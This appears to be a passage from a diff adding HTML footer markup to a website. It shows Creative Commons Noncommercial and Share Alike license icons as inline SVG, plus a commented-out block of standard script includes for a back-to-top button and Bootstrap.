+                        <path d="M247.6 8C387.4 8 496 115.9 496 256c0 147.2-118.5 248-248.4 248C113.1 504 0 393.2 0 256C0 123.1 104.7 8 247.6 8zM55.8 189.1c-7.4 20.4-11.1 42.7-11.1 66.9c0 110.9 92.1 202.4 203.7 202.4c122.4 0 177.2-101.8 178.5-104.1l-93.4-41.6c-7.7 37.1-41.2 53-68.2 55.4v38.1h-28.8V368c-27.5-.3-52.6-10.2-75.3-29.7l34.1-34.5c31.7 29.4 86.4 31.8 86.4-2.2c0-6.2-2.2-11.2-6.6-15.1c-14.2-6-1.8-.1-219.3-97.4zM248.4 52.3c-38.4 0-112.4 8.7-170.5 93l94.8 42.5c10-31.3 40.4-42.9 63.8-44.3v-38.1h28.8v38.1c22.7 1.2 43.4 8.9 62 23L295 199.7c-42.7-29.9-83.5-8-70 11.1c53.4 24.1 43.8 19.8 93 41.6l127.1 56.7c4.1-17.4 6.2-35.1 6.2-53.1c0-57-19.8-105-59.3-143.9c-39.3-39.9-87.2-59.8-143.6-59.8z" fill=currentColor/>
+                    </symbol>
+                    <use xlink:href=#ai:fa6-brands:creative-commons-nc></use>
+                </svg>
+                <div class="content right" data-astro-cid-p3givckg>
+                    <p data-astro-cid-p3givckg>Noncommercial</p>
+                </div>
+            </span>
+            <span class=entry data-astro-cid-p3givckg>
+                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-sa height=1em viewBox="0 0 496 512" width=0.97em>
+                    <title>Share Alike</title>
+                    <symbol id=ai:fa6-brands:creative-commons-sa>
+                        <path d="M247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3zM137.7 221c13-83.9 80.5-95.7 108.9-95.7c99.8 0 127.5 82.5 127.5 134.2c0 63.6-41 132.9-128.9 132.9c-38.9 0-99.1-20-109.4-97h62.5c1.5 30.1 19.6 45.2 54.5 45.2c23.3 0 58-18.2 58-82.8c0-82.5-49.1-80.6-56.7-80.6c-33.1 0-51.7 14.6-55.8 43.8h18.2l-49.2 49.2l-49-49.2h19.4z" fill=currentColor/>
+                    </symbol>
+                    <use xlink:href=#ai:fa6-brands:creative-commons-sa></use>
+                </svg>
+                <div class="content right" data-astro-cid-p3givckg>
+                    <p data-astro-cid-p3givckg>Share Alike</p>
+                </div>
+            </span>
+        </a>
+    </div>
+<!--
+<script type="text/javascript" src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script type="text/javascript" src="https://unpkg.com/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+<script type="text/javascript" src="https://unpkg.com/bootstrap@5.2.1/dist/js/bootstrap.min.js"></script>
+<div id="back-to-top" class=""><svg viewBox="0 0 24 24"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path></svg></div>
+-->
+</div>
+</body>
+</html>
